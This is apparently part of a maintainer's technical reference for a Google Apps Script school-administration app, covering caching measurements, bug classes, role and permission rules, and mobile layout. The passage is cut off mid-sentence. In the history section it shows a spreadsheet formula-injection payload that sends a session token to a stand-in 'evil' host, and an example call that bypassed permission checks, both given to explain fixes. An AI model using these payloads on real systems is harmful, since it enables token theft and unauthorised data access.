⚠️ **It was immediate until v150, and that was wrong.** Appending a blank row on click
meant 「行を追加」 always wrote whatever you did next, and 保存せずに移動 could not take
it back — it discarded the queued *field* edits and left the row behind. Reported from
staging. That change retired the whole optimistic-add apparatus
(`_recConfirmPendingRow`, `_recHoldPendingEdit`, `_recAddInFlight`, `_recPendingEdits`,
`_recPendingAdds`) and `tests/pendingrow.test.js` with it: there is no add in flight to
manage any more.

⚠️ **番号 stays blank until 保存.** `addOtherVisaRow` assigns it inside its lock; a
number invented in the browser would collide with a concurrent add. A number the user
types is sent and wins.

⚠️ **Deleting a local row must not go through `_recDropRow`.** That renumbering is
about real sheet rows a real delete shifts; the sheet never saw this one.
`_recDropPendingRow` splices and stops.

⚠️ **A landed add forces a reload even on a partly-failed batch.** Normally a partial
failure does *not* reload, so the red markers stay. But if an add succeeded while
something else failed, the model still holds that row as `_pendingId` while it now also
exists in the sheet — and the next 保存 would **create it a second time**. A duplicate
row is worse than losing the markers.

⚠️ **`REC_ADD_FIELDS` in `Code.js` is a second copy of each cell saver's column map** —
the drift class `tests/visacolumns.test.js` exists for. A column added to a saver and
not here is simply never written on a new row, silently; `tests/recsave.test.js`
compares the two in both directions.

⚠️ **`waiting` is a flag, never `!!done`.** `done` is a wrapper `recSaveAll` always
builds, so `if (done)` was true even from a plain 保存 click — which silently stopped
the post-save `recLoad()` from ever running, and with it the 残枠 / 前年 resync a 定員
edit needs. Shipped at v149, found by the suite at v150.

Row **削除 stays immediate**, so `_recDropRow` / `_recRestoreRow` / `_recShiftDirtyOps`
and `tests/sheetrow.test.js` all still apply exactly as written above.
`tests/recsave.test.js` covers all of this.

---

## 8. Caching & Performance

**Measured floor: a `google.script.run` to a function whose whole body is
`return 1` costs ~1s.** That is the HTTPS round trip, container start and parsing
all of `Code.js`, before any of our code runs. So the **number** of calls matters
far more than their size, and no server call can ever feel instant. Anything that
must feel instant has to happen without one — see optimistic writes below.

**Every separate sheet read costs ~200–400ms of fixed overhead regardless of
size.** Measured on staging: a 2-row `Announcements` read took 238ms; a
385-row `Schedule_DB` read via `getDataRange()` took 597ms, while `batchGet` of
Schedule_DB *and* Teacher_Master together took 283ms. So the number of reads
matters far more than the rows in them — which is what `_readTabs_` exists for.

| Mechanism | Applies to |
|---|---|
| CacheService (server, shared) | `_getRealStats_`, `getLiveReportData`, `getRecruitmentContext`, `getInterviewResults`, `getPlacementResults` (5 min); `_enrolmentByIntakeMonth` (30 min) |
| Version-stamped keys | Cache keys embed a stamp; the student sync bumps it, invalidating everything student-derived at once. `_cacheVersion_()` is memoised per execution, and `_bustStudentCache_` clears that memo |
| Request batching | `getRecruitmentBundle` returns grid data, vocabularies, previous-year figures and the note in one call. `getBootBundle` does the same for the entire login path |
| Sheets advanced service | `_recruitBatchValues_` reads all six 募集 tabs in ONE `batchGet`; `_bulkReadSheets_` does the same for the student/config/schedule/dorm tabs. Both fall back to per-sheet `getDataRange()` if the service is unavailable, so a missing scope costs speed and never correctness |
| Per-execution memo | `_readTabs_` fetches a tab at most once per request; `_forgetTab_` drops one after a write so a later read in the same execution sees it |
| Client-side caches | Booking option lists; theme in localStorage; the whole teacher schedule (week navigation is client-side) |
| Optimistic writes | 留学ビザ以外 and キャンセル adds and deletes apply locally and render at once, then tell the server — the only way to beat the ~1s floor |
| Deferred loads | 修了・卒業生 (`getDashboardData(role, true)` on first sub-tab visit); the XLSX library (`_withXlsx`, on first export) |

### 8.1 The boot path

Login used to cost **four calls in two serial waves**: `resumeSession` alone,
then `getDashboardData` + notifications + announcements fired concurrently.
Concurrent calls contend and inflate each other, so this was far worse than four
times a cheap call.

`getBootBundle(token)` returns user + dashboard + notifications + announcements
in one call, and `loginUser` returns the same `boot` key so a fresh PIN login
gets one round trip too. `_bootPayload_` primes `_readTabs_` with everything the
user is entitled to, so all three producers share a **single** `batchGet`.

Measured: 537 + 345 + 296 = **1178ms of server work → 327ms**, in one call
instead of four. It is faster than `getDashboardData` alone used to be.

The call is fired from the **pre-paint script block**, not `DOMContentLoaded`, so
the ~1s round trip overlaps the remaining ~500KB of parse. It is strictly an
accelerator: `google.script.run` is injected by the sandbox and may not exist
that early, so a missing API falls through to the old path.

⚠️ **Every consumer of `boot` must fall back to fetching it the old way.**
`_bootPayload_` try/catches each producer individually, so any piece may be
absent. A failing announcement read must never cost someone their login. This
also covers a real divergence: the backend's `_hasPerm_` does not expand a literal
`permissions === "ALL"`, while the front-end's `hasPermission()` does — such a
user simply gets the fallback path.

### 8.1.1 Production baseline (2026-08-07, `@232`)

Medians of three samples, production. Sheet sizes at the time: Central_DB 607,
Past_DB 1449, Schedule_DB 434, Interview_Results 442, Room_Info 336.

| Producer | median ms | payload bytes | |
|---|---|---|---|
| `_bootPayload_` (replaces 4 calls) | **305** | **157,664** | the login path |
| `getDashboardData` (no past) | 312 | 157,612 | ≈ all of the boot payload |
| `getDashboardData` (+past) | 419 | 459,874 | 2.9× the payload — deferred, see §8.2 |
| `getDormData` | 279 | 173,593 | |
| `getAllTeachersSchedule` (all) | 207 | 116,048 | |
| `getAllTeachersSchedule` (1 week) | 222 | 15,811 | **slower** than fetching everything |
| `getRecruitmentBundle` | 242 | 3,943 | |
| `getInterviewResults` | 31 | 49,302 | `_cached_` — 380ms cold |
| `getLiveReportData` | 24 | 4,524 | `_cached_` — 410ms cold |
| `getPendingNotifications` | 245 | — | |
| `getAnnouncements` | 180 | — | |
| `_snapshotSheet_(Schedule_DB)` | 5,235 | — | single sample, see below |

Three things this baseline establishes:

- **Boot is at parity with the 327ms recorded in §8.1**, on an unchanged ~158KB
  payload, after the 進路, ホーム, 修了・卒業生進路 and roles work all landed. None
  of it cost anything on the login path.
- **The cache is worth 12–17×** on the two producers that have one, and only
  those two move: 380→28ms and 410→23ms across the three samples.
- **One week of schedule costs more than all of it** (222ms/15KB vs 207ms/116KB).
  The client fetching the whole schedule so week navigation needs no round trip is
  the right call, and this is the measurement that says so.

⚠️ `_snapshotSheet_` is measured **once**, not three times — each call writes a real
backup into a rotation that keeps only `SNAPSHOT_KEEP` (10) per sheet, so
profiling it three times would discard three genuine Schedule_DB backups every
run. Which means it is also the one figure in this table that a single sample
cannot support: it read 3,060ms in an earlier profile and 3,144ms on staging the
same day. Treat it as "seconds, and the dominant save cost", not as 5,235.

### 8.2 Payload, not just latency

Dropping Past_DB from boot saved **no meaningful server time** (537ms vs 487ms —
noise). It cut the payload 408KB → 158KB. Distinguish the two: for
`getAllTeachersSchedule` and `getDashboardData` the win was bytes on the wire and
DOM build time, not sheet reads.

The calendar deliberately fetches **all** weeks (`getAllTeachersSchedule("")`)
and navigates client-side. One 101KB payload on entering the tab beats putting a
~1s round trip behind every arrow press. The per-week filter is kept because it
is the natural lever if Schedule_DB outgrows a single payload — it only ever
accumulates rows.

### 8.3 The save path

`saveScheduleBatch` ran ~2.7s of fixed cost before touching the actual change:

| | was | now |
|---|---|---|
| `_snapshotSheet_` | 1928ms, **every save** | throttled to once per `SNAPSHOT_THROTTLE_SEC` (10 min) |
| Schedule_DB read | 597ms (`getDataRange`) | ~280ms (`_readTabs_`) |
| `DriveApp.getFolderById` | 218ms, every save | only when an update carries a file |
| Cell writes | **14** separate `setValue` calls per update | 4 contiguous range writes |

⚠️ **Writes go in contiguous ranges, and the ranges stop short of columns 2–5 and
17–22 on purpose.** 2–5 are the lookup key; 17–22 are the `BookerReq_*` block
belonging to another workflow. Do not "simplify" this into one row-wide write.

`_snapshotSheetThrottled` is used **only** by `saveScheduleBatch`. Rare
destructive operations — row deletes, restores, migrations,
`requestBookerDateChange` and friends — still call `_snapshotSheet_` directly,
where a full copy per call is the right price.

The remaining ~1150ms is irreducible: `copyTo` across documents is 724ms and
`openById` on the external backup file is 215ms. The prune is 7ms, so optimising
it buys nothing. Deferring it to a `ScriptApp` trigger would zero it, but was
rejected: trigger quota, cleanup that must not leak, and a silent-failure mode
where backups quietly stop and nobody notices until they are needed.

⚠️ Throttling means most saves have **no pre-write snapshot**. The recoverable
state is whatever the 10-minute window started at. In exchange `SNAPSHOT_KEEP=10`
now spans ~100 minutes of history instead of however long ten clicks take —
before, ten toggles in one afternoon evicted every older backup.

⚠️ **`getLastYearCourseCounts` must not be cached per intake.** The scan is
identical for every intake; only the year/month picked out of it differs. A
per-intake key re-scanned Central_DB + Past_DB on every switch, costing seconds
each time. It now buckets the whole scan once under a single key
(`enrolByIntakeMonth`) and slices per intake.

⚠️ **A blank intake is resolved server-side.** `getRecruitmentData(..., resolveBlank)`
picks the newest intake and returns it as `resolvedIntake`. Previously the first
open fetched every intake's counts, discarded the payload, and re-fetched scoped
— two round trips where one does. §9.7 still applies to any other caller.

⚠️ **Rows carry `_sheetRow`, the spreadsheet row index.** Deleting row N shifts
every later row down by one. A full refetch used to hide that; the optimistic
paths renumber explicitly in `_recDropRow`. Get it wrong and the *next* delete
removes the wrong person. Deletes are blocked while an add is in flight, because
the server computes that add's row index before the delete lands.

⚠️ **Adds must hold a script lock.** `addOtherVisaRow` reads the highest 番号
then appends; without `LockService` two quick adds both read the same maximum and
assign it twice. `addCancelRow` locks too — concurrent appends otherwise report
the same `getLastRow()`, pointing two rows at one sheet row.

⚠️ **Cell edits must write back to the local model** (`_recApplyCellToModel`).
Now that edits no longer trigger a `recLoad()`, any re-render rebuilds the inputs
from `recData`, so anything not written back is silently wiped off the screen.
⚠️ **`_recQueueCapacity` is in this rule too, and was the bug found writing it.**
`recRenderCapacitySummary` runs on any 課程 change in 留学ビザ以外 / 不交付 /
キャンセル, so a 定員 typed but not written back vanished from the screen — and the
live re-read in `recSaveAll` then picked the *old* number back out of the freshly
rendered input and saved that.

⚠️ Permission checks must stay **outside** the cached producer — a cached value
must never let an unauthorised caller bypass its check. (Extracting a producer
once moved a role check inside a function that no longer received the role.)

Service workers and HTTP cache control are unavailable: GAS serves the app in a
sandboxed iframe on a domain you don't control. Application-level caching is the
only option.

---

## 9. Recurring Bug Classes

Each of these has caused real, hard-to-diagnose faults. They recur because they
fail **silently**.

### 9.1 Identity by name rather than ID
Buildings, courses and recruiters are matched by name string. This produced the
WestJapan alias problem, the か/カ miscount, and the inability to distinguish two
recruiters sharing a name. Compare through `_normName_` / `normName`; trim
building IDs on both sides. *The React rewrite fixes this structurally with real
foreign keys.*

### 9.2 Invisible characters
Full-width spaces (U+3000), trailing spaces and full-width ASCII have broken
sheet-tab lookups, placement results and staff matching. When a lookup finds
nothing that plainly exists, suspect character variance first.

### 9.3 Leading-zero coercion
`"0123"` loses its zero when written as a number. Set the cell format to text
**before** writing and write a String. Bulk `setValues` re-coerces, so
`_applyRoomInfoFormats_` runs before and after the dorm sync and after restores.

### 9.4 Array reference vs copy
Reading a constant's array and pushing to it mutates the constant for the
session — this made courses accumulate on every intake switch. Always `.slice()`
before modifying.

### 9.5 Temporal dead zone
A `let`/`const` read before its declaration throws. Functions that run during
page load must only reference variables declared above them. This broke the
student list once (`_expScope`).

### 9.6 Missing DOM elements
An unguarded `getElementById('x').style` on a removed element throws and takes
the whole render path down silently. After structural edits, verify every DOM
reference resolves.

### 9.7 Scope of a blank filter
A blank intake means "no filter" in `getRecruitmentData`, so the first load
returns every intake's data. The UI re-fetches once a concrete intake is chosen.

### 9.8 Platform limits
- 6-minute execution limit; daily quotas on email and Drive operations.
- GAS cannot merge PDFs — building documents stay separate downloads.
- Sheets grow slower over time; Central_DB is 530+ rows and rising.

---

## 10. Common Maintenance Tasks

| Task | How |
|---|---|
| Add a user | ユーザー管理 → form → tick permissions. The role alone grants nothing |
| Add a recruitment intake | 募集状況 → ＋入学期. Becomes available in bookings and interview results too |
| Change which courses run in a month | Edit `REC_COURSES_BY_MONTH` in `Index.html`. PlacementTest_Config extends but never replaces |
| Fix a dorm that won't auto-assign | Add a `Dorm_Aliases` row, then run 割当テスト |
| Delete a room / building | Room edit modal → 部屋を削除 (`edit_dorms`). Building edit modal → 建物を削除 (admin, cascades) |
| Recover a bad write | Data Safety → snapshot list → restore |
| Force fresh student figures | Run the student sync; it bumps the cache stamp automatically |
| Send an announcement | ユーザー管理 → お知らせ配信 (master only) |

Moving or renaming spreadsheet **files and Drive folders is safe** — everything
is referenced by ID. **Never rename a sheet tab or a column header.**

---

## 11. Long-Term Risks

- **Single maintainer.** This document is the mitigation. Keep it current — a
  stale reference is worse than none, because it will be trusted.
- **Staging exists now.** A second Apps Script project bound to a copy of the
  spreadsheet, pushed with `clasp -P .clasp-staging.json push`. A bare
  `clasp push` still goes to production, so the `-P` is what keeps them apart.
  The copy is a point-in-time snapshot and does not track production; it also
  holds real student records behind an `ANYONE_ANONYMOUS` URL, so treat its link
  as sensitive. Script Properties do not copy, so staging has its own (empty)
  backup file and sync config.
- **File size.** `Index.html` is 628KB / 10,838 lines and `Code.js` 8,400. Edits
  are increasingly risky; this is the strongest argument for the planned rewrite.
- **Name-based identity.** See §9.1. Resolved only by moving to real IDs.
- **Data-entry inconsistency.** Most faults originate in inconsistent source
  data. Every new comparison must use the normalisers.
- **External dependencies.** The backup store, placement result sheets, and
  Central_DB/Past_DB. Check the constants if any of these move.
- **Unused code.** The personal 面接スケジュール view was removed on 2026-08-07
  (`b6c207e`, `eea0702`) — 294 lines. It had been unreachable twice over: the tab
  handler redirected to `view-shared-schedule`, and its only button was hidden for
  every role.

  ⚠️ Worth remembering before the next such removal. Deleting the markup alone
  would have taken the app down for **every user of every role**:
  `setupInterfaceBasedOnRole` dereferenced `btnNotifToggle` — a button inside that
  view — unguarded in *both* branches of a role check, mid-function and before
  `switchMainTab(defaultTab)`. No tab would have rendered and nothing on screen
  would have said why. Dead markup is rarely dead on its own; something live
  reaches into it. `tests/domrefs.test.js` now catches this class outright.

## 12. History (2026-09-29)

On 2026-09-29 the incident histories moved here from the maintainer's working notes: what
was measured, how each bug was reported and found, what shipped wrong. The text below is the
whole of each section **as it stood that day, moved verbatim**, one heading level down. The
notes keep the rule, the trap and one sentence of reason, and point here by the same heading.
When the two disagree, the code is current; this is the record of why.

### Roles & permissions

- `master` — the master-PIN account (`permissions: "ALL"`). Bypasses **every**
  permission check, including any added later. Cannot be assigned to a user.
  **The PIN lives in the `SYSTEM_PIN` script property, never in `Code.js`** —
  this repo is tracked, so a value written in the file is in git history for
  good. Set it by hand in ⚙ Project Settings → Script Properties; there is
  deliberately **no** `setSystemPin` function (it was a takeover vector). Check
  it with `checkSystemPin()`.
  There is **no in-file fallback**: unset means master cannot log in, and live
  master sessions are revoked on resume. Script properties do not survive
  File → Make a copy, so **set it in staging separately**.
- `sales` / `teacher` — hold exactly the permissions ticked for them. The role by
  itself grants nothing.
- ⚠️ **Admin level is the exception, and it OVERRIDES the ticks.** `_hasPerm_` returns
  true for any admin-level caller, so 管理者権限 grants **every** permission — reaching
  what the holder's department is not otherwise entitled to see is the point of it.
  This reverses the older rule that "an ordinary admin holds exactly what is ticked";
  the ticks are still stored and apply again the moment the flag comes off.
  ⚠️ It does **not** reach the master-only work — 役割管理 (`saveRole` / `deleteRole` /
  `resetRoleDefaults`), お知らせ配信, and granting 管理者権限 itself all guard with
  `_isMasterRole_`, not a permission. That is what stops a flagged admin promoting
  themselves, and `tests/roles.test.js` §16 asserts each one.
- **Custom roles are permissions only**, plus one optional flag. The master
  creates them in 役割管理 (`Roles` sheet); they otherwise behave exactly as
  `sales`. The built-ins stay defined in `BUILTIN_ROLES` in `Code.js` because the
  role string carries *behaviour* — which sheet a user is stored in, which
  notification feed they get, one branch of the booking flow — and none of that is
  inheritable by a name. See TECHNICAL_REFERENCE §3.
- **`管理者権限` — admin power without the admin name.** A custom role can be
  flagged admin-level, so a department manager reaches the seven operations no
  permission grants while their role still displays as 教務部. Two predicates, and
  conflating them breaks it:
  - **`_isAdminLevel_`** — may they do it at all. Widened by both flags, and now also
    consulted by `_hasPerm_`, so it answers "everything short of master". Any *new*
    admin-only operation almost certainly wants this one.
  - **`_isAdminRole_`** — are they *literally* 管理者/master. Governs behaviour: the
    notification feed, and whether ホーム shows an interview list. Must stay
    literal, or a 教務部 manager stops seeing their own interviews.

  ⚠️ **The `admin` role itself is unassignable — by anyone, master included.** The
  flag replaced it: it grants the same seven operations while the holder still
  displays as their department, so leaving both would be two ways to grant one
  thing, and the wrong one renames somebody 管理者 on every screen. Reading a
  stored `admin` still works, so a row hand-edited in the sheet is honoured rather
  than silently demoted; only the write path is closed.

  Granting a **flagged** role is master-only — the flag must never become a way
  around that guard. The client mirrors the server's decision via `user.isAdmin`;
  it must not re-derive it from the role name.

  ⚠️ The flag is on the **role**, and also on the **person** — `管理者権限`, column 13 of
  `Staff_Master` *and* `Teacher_Master`. `_isAdminLevel_` is the only place the two are
  combined; anything re-deriving admin-ness elsewhere will drift, which is why the
  client mirrors `user.isAdmin` instead of inspecting either.
  - The **role** flag suits a whole department (教務部長). Every holder gets it.
  - The **person** flag is the only way to reach a 教務: `teacher` selects
    `Teacher_Master` in five places including `_resolveUserById_` on the login path, and
    `currentUser.role === 'teacher'` is tested LITERALLY to set `currentTeacherId`.
    ⚠️ Move a 教務 manager to a custom role and they gain admin power at the cost of
    their own 面接スケジュール. On their own row they keep both.
  - Both are **master-only**, and both **fail closed** — a literal `"Y"`, nothing else.
    ⚠️ A non-master editing a colleague must leave the cell untouched rather than
    writing `""`, or an ordinary email edit silently strips someone's admin level.

⚠️ **Built-in roles are editable — 表示名 and 既定の権限 only.** A `Roles` row keyed
`sales`/`teacher`/`admin` is an **override** that merges those two fields onto the
built-in. Safe because a role's perms are only what gets pre-ticked when creating a
user: live access comes from the user's own row (`_userFromRow_` → `row[5]` →
`_effectivePerms_`), so editing them changes nobody's access.
- ⚠️ **`admin` and `builtin` are NEVER read from the sheet.** `_isAdminLevel_` reads the
  flag live, so a row flagging `sales` would promote every existing 営業 account the
  instant it saved — no per-user step, no warning. Guarded twice: `_roles_()` refuses to
  read it, and `saveRole` refuses to write it for a built-in key.
- ⚠️ **`deleteRole` still refuses built-ins** — removing 営業 strands every account
  holding it, which fails closed at login as a lockout with no visible cause. `既定に戻す`
  (`resetRoleDefaults`) is the undo instead: it drops the override row only.
- ⚠️ **`roleLabel` consults `rolesData` BEFORE `ROLE_LABELS`.** The hardcoded map used
  to win, so an overridden built-in named itself 営業部 on the roles table and 営業
  everywhere else. `ROLE_LABELS` remains the pre-fetch fallback — the header badge draws
  before any fetch, and most users never receive `getRoles` at all.
- **Don't add a role check where a permission check would do.** Ten endpoints
  were guarded as "is the caller 営業", which refused every custom role however
  its permissions were ticked — and failed as a *broken screen*, because the
  sidebar gates on the permission and only the data behind it threw. Use
  `_permOrLegacyRole_(role, perms, needed, legacyRoles)`. `_roleIsAnyOf_` should
  keep exactly one caller.
- Enforce on **both** sides. Hiding a button is not access control; and the UI
  must not be stricter than the backend either.
- ⚠️ **A session-aware guard OR'd with a client-supplied one is not a guard.**
  Twelve endpoints were written as

  ```js
  if (!_isMasterRole_(userRole) && !(userPerms && String(userPerms).split(",").indexOf("edit_dorms") !== -1))
  ```

  `_isMasterRole_` consults the session; the half beside it read the string the
  browser sent. `&&`-ed like that, the weaker half decides on its own — so
  `google.script.run.saveBuilding({permissions:"edit_dorms"})` wrote the sheet
  with no session at all, and `getSystemUsers("", "manage_users")` handed an
  anonymous caller every staff name, email and password state. Found 2026-08-19,
  all twelve routed through `_hasPerm_`.

  The rule: **a permission decision never reads a permission string itself.**
  Pass the arguments to `_hasPerm_` / `_permOrLegacyRole_` and let them go through
  `_effectivePerms_`. `tests/endpoints.test.js` §3.1 fails on the shape, matching
  any identifier ending in `perms`/`permissions` — the first version listed
  `userPerms` by name and missed two spellings of the same hole.

  It hid for so long because the suite's `GUARDS` list contained the literal
  string `'権限がありません'`: a function counted as guarded for **containing the
  error message**. Never add anything to that list that is not the name of a
  function which consults the session.
- ⚠️ **`_userFromRow_` is the ONLY place a user object is built, and it must stay that
  way.** `_resolveUserById_` used to hand-build the same shape, and the copy drifted the
  instant 管理者権限 moved onto the person's row: `loginUser` carried the flag,
  **session resume did not**. The symptom was a flagged 営業 *seeing* the admin panel —
  drawn from the login payload — while every call behind it threw 権限がありません, guarded
  from the resumed session. Nothing failed at the point of the mistake, and the whole
  test suite still passed. `tests/roles.test.js` §17 now asserts **structurally** that
  exactly one `isAdmin:` literal exists, because a behavioural check cannot see a second
  copy. Same lesson as `_calCellState`.
- ⚠️ **`_hasPerm_` is NOT the only permission helper, and the other two drifted.**
  `_hasRecruitPerm_` (24 endpoints) and `_hasResultPerm_` (10) each decide a permission,
  and neither got `if (_isAdminLevel_(role)) return true;` when the flag was widened. A
  flagged 教務 was refused by **34 endpoints** — 募集状況 and 面接結果 — while every other
  screen worked. Fixed 2026-09-07.
  - ⚠️ **Invisible from either side alone.** The client granted it (`recCanView` →
    `hasPermission` → `isAdminRole` → true), so the sub-tab appeared and everything
    behind it threw 権限がありません. Same shape as the `_resolveUserById_` bug above:
    a second copy of a decision, drifting when the decision changed.
  - ⚠️ `_hasRecruitPerm_`'s comment *defended* the opposite rule ("ordinary admins are
    governed by their own 募集状況 permissions"). It predated the reversal. **When a rule
    is reversed, grep for every place that restates it** — a stale comment is what made
    this look intentional.
  - `tests/roles.test.js` §18 enumerates every `_has*Perm` **from the source** and fails
    if any omits the line. A behavioural test cannot see a fourth helper that does not
    exist yet; that is the whole reason the check is structural.
- **Login is email + salted/hashed password** (`loginUser(email, password)`).
  Anything that changes a credential must resolve the caller from the **session
  token**, never from a client-supplied role — the rest of the app still trusts
  the client in ~60 places, and that must not spread to credentials. See
  TECHNICAL_REFERENCE §6.1.

### The recurring bug class

**Identity by name string rather than by ID.** Buildings, courses, and
recruiters are all matched by name. This produced the WestJapan alias problem,
the か/カ course miscount, and the inability to distinguish two recruiters
sharing a name. Always compare through `_normName_` (backend) / `normName`
(frontend); trim building IDs on both sides. Invisible characters — full-width
spaces (U+3000), trailing spaces, full-width ASCII — are the usual culprit when
a lookup finds nothing that plainly exists.

Related: writing `"0123"` as a number loses the leading zero. Set the cell
format to text **before** writing and write a String.

⚠️ **And a value starting with `=` or `+` becomes a FORMULA, not a label.** A 備考
of `=IMPORTXML("https://evil/?d="&Sessions!A2,"//a")` runs the next time anyone
opens the workbook — reading the hidden `Sessions` sheet and posting a live token
out. Nothing looks wrong in the app, because reads go through
`getDisplayValues()` and get the *result*. Write free text through
`_cellSafeRow_([...])`, wrapping the **array** at the write site, never the fields
inside it — the positional contract is the worse bug class (§8.3). The CSV export
has its own wider guard for Excel. See TECHNICAL_REFERENCE §6.1.0.

⚠️ **`-` is a formula starter too, and was unguarded until 2026-09-07.** Sheets evaluates
`-IMPORTXML("https://evil/?d="&Sessions!A2,"//a")` and runs the fetch exactly as the `=`
form does. `f06b233` shipped a test asserting the dash form was neutralised — and it
**passed for months without the guard existing**, because that suite's hand-transcription
of `_cellSafe_` had drifted (see Testing). `_cellSafe_` now guards `-` with **bare numbers
exempt**, the same split `_expCsv` already made for Excel, so `-5` stays a number.
- ⚠️ **The exemption is a whitelist of one shape, not a blacklist of dangerous ones.** The
  obvious fix — add `-` to the *strip* set and re-test for `=` — catches `-=1+1`, which is
  what the test asked for, and leaves `-IMPORTXML(…)` wide open, because after stripping it
  begins with `I`. `tests/cellsafe.test.js` §7 asserts the strip set stays whitespace and
  control characters only, for exactly this reason.
- The widening text-flags a few ordinary values (`-3人`, `-`, `-2024-04-01`). ⚠️ That is
  **invisible**: the leading apostrophe is Sheets' own text marker and is not part of the
  value, so reads give back the same string and every lookup is unaffected.
- ⚠️ **`tests/cellsafe.test.js` §8 binds the transcription to the source.** Measured: with
  only the call-site checks, `Code.js` could lose its `=`/`+` rule **entirely** and all 65
  checks still passed. A transcription with no binding tests the copy, not the code — which
  is how `[\s -]` survived here for months.

### User-facing language

⚠️ **Nothing a user sees may name an internal thing** — not a tab (`Central_DB`,
`Room_Info`), not a column, not 「スナップショット」 or 「データベース」. The ~10–20 daily
users are teachers and admissions staff. **Messages thrown from `Code.js` count as
"on screen"**; the file they live in is irrelevant. Use the vocabulary already there:
学生一覧 / 寮管理 / 部屋一覧, 学生データ, 部屋データ, 面接スケジュール, バックアップ.

Messages a user **cannot act on** carry a stable `AREA-NN` code instead of an
instruction (see TECHNICAL_REFERENCE §6.4.9). Messages they **can** act on keep the
instruction and get **no code** — that split is what keeps a code meaning "call the
maintainer" rather than "the app is broken". ⚠️ Codes are **append-only**: never
renumber, never reuse a retired one.

`node tests/wording.test.js` enforces both, and asserts the code table and the
emitted codes match in **both** directions. Its `ALLOWED` list is keyed by *function
name* and holds only functions no ordinary user can reach — editor-run diagnostics,
migrations, backfills. The 操作履歴 target column is exempt on purpose: it is an audit
trail read only by admin-level users, and naming the real sheet is the point.

### Mobile

⚠️ **Every mobile rule lives inside `@media (max-width: 820px)` at the end of the
style block, and no rule above it was edited.** That is the "must not interfere with
the web version" guarantee, and it is mechanical rather than a promise — a max-width
query cannot apply at desktop widths. ⚠️ **`!important` appears only inside that
block** (131 rows in this file carry an inline `style="display:flex"`, which beats a
stylesheet rule); confining it is what stops the overrides leaking up.
`node tests/mobile.test.js` asserts both halves, plus a baseline of the 10
pre-existing desktop `!important`s that may only go down.

⚠️ **The sidebar has TWO levels and mobile needs two places for them.** The
sub-navigation (`#sb-sub-students`, `#sb-sub-dorms`, …) and the footer (logout, dark
mode, the bell) both live *inside* `.app-sidebar`. Flattening it into one bar hid
`.sb-sub` and stranded every sub-tab in the app — shipped in `@131`, found on a
phone. Now: `.sb-nav` is the bottom bar, `.sb-sub.open` is lifted to a fixed strip at
the top (`switchMainTab` already marks exactly one), and `.sb-footer` sits top-right.
⚠️ `.app-sidebar` sets **three** containing-block creators — `backdrop-filter`,
`-webkit-backdrop-filter` and `will-change` — and any one of them makes a
`position: fixed` child resolve against the sidebar instead of the viewport, putting
the whole top row inside the bottom bar. Unsetting only the unprefixed one is a
half-fix that looks right on desktop and fails on iOS.

⚠️ **A stray `</div>` closes `.sb-footer` right after the bell**, so `#userBadge`,
`#btn-logout` and `#btn-dark-mode` are direct children of `.app-sidebar`, not of the
footer. Target them individually; a `.sb-footer`-scoped selector cannot match them
and they reappear in the bar. The markup is worth repairing, but only with a desktop
check: `.sb-footer` carries its own `padding` and `align-items`, so moving them in
changes the desktop rail.

⚠️ **`sidebar-open` is never applied below the breakpoint.** Seven desktop rules key
off it (`width: 220px`, `text-align: left` on `.nav-btn`, `display: block` on
`#userBadge`, …) and every one leaked into the bottom bar the moment a tab was tapped,
since tapping calls `_setSidebarOpen`. Three separate mobile bugs came from that, each
"fixed" by overriding one more rule. `_sidebarDrawerAllowed()` now guards **both**
`_setSidebarOpen` and `_sidebarAfter` — ⚠️ the latter toggles the class itself, so
guarding one leaves the other path open. It fails **open** (behaves as desktop) when
`matchMedia` is unavailable. The CSS overrides remain as a fallback if the guard is
ever reverted.

⚠️ Logout is hidden on mobile only because `#acctLogout` exists in アカウント設定; it
is `display:none` in the markup and revealed solely inside the media block, so desktop
does not gain a second one. `tests/mobile.test.js` asserts the pair, as it does for
dark mode. ⚠️ Logout exists **only** there, so it may never be
hidden; `#btn-dark-mode` may be, but only because アカウント設定 → 表示設定 carries the
same control, and `tests/mobile.test.js` asserts the pair together.

⚠️ **Meta tags must be added in `doGet` via `addMetaTag()` — a `<meta>` written into
`Index.html` is IGNORED.** HtmlService serves that file inside a sandboxed iframe on
a Google origin; only `addMetaTag` reaches the top-level wrapper the browser takes
its viewport from. Only four names are accepted: `viewport`, the two
`*-web-app-capable` ones, and `google-site-verification`.

⚠️ **A real PWA install is not possible** — no top-level document for a manifest, and
nowhere to register a service worker. The two capable tags make 「ホーム画面に追加」
launch without browser chrome, which is the part staff notice. The only route to a
true install is an iframe wrapper on a self-hosted site, which needs
`XFrameOptionsMode.ALLOWALL` — that would undo the clickjacking protection, and Apps
Script offers no allowlist. Considered and deferred; don't re-propose without that
trade being the point.

⚠️ **面接スケジュール is the one view that is REPLACED on mobile, not overridden.** Its
column axis is day × teacher — `1 + 5×N` columns, and `calRenderGrid` deliberately
sets no `min-width` so the whole week stays visible — which at 390px with eight
teachers is ~7px a column. No override rescues that. `#calMobilePanel` (the
`#acctLogout` pattern: inline `display:none`, revealed only in the media block) holds
a second table showing **one teacher's week**, six columns, picked from
`#calTeacherSelect`. `#sub-view-schedule .schedule-grid` is hidden — paired, so
hiding one without revealing the other takes the tab off the phone entirely.
- ⚠️ **Both tables are built on every `calRenderGrid`, and nothing branches on
  viewport.** CSS alone decides which is on screen; that is what makes "desktop is
  untouched" provable rather than promised — and it *was* proved, by a pixel diff of
  `driver.mjs shot --vp desktop --tab admissions` before and after. The only
  **viewport** `matchMedia` in the file still belongs to `_sidebarDrawerAllowed`; the theme's
  `prefers-color-scheme` query decides colour, not layout, and `mobile.test` §18 counts the two
  kinds separately.
- ⚠️ **`_calCellState` is the single cell mapper**, shared by both. A copy drifts on
  the first status added, and two calendars disagreeing about who may click what is a
  permissions bug wearing a layout bug's clothes. Its `key`/`tid` local names and the
  desktop `title=` emission sites are pinned by `calmerge` §232 and `xss` §265–266 —
  move code into it, don't rename around it.
- ⚠️ **An incoming 交代依頼 sits on the REQUESTING teacher's row**, targeting the
  current user. One teacher at a time would hide every request addressed to you
  behind a dropdown you had no reason to open, so those teachers' options carry a
  `●`. Dropping the marker makes the request unreachable on a phone.
- ⚠️ **`◀`/`▶` stay in the `.btn-label` text.** The chevron SVGs are `display:none` on
  desktop, so removing the arrows stripped the direction cue off the web version —
  caught by the pixel diff, not by a test, which is why it is one now.
- ⚠️ **`updateNotifButton` / `toggleNotif` write the label span, never `innerText`.**
  `innerText` replaces every child, deleting the icon and leaving a blank square.
- The mobile table restates `border` / `text-align: center` itself: it cannot carry
  `.schedule-grid` (that class is the thing being hidden) and would otherwise fall
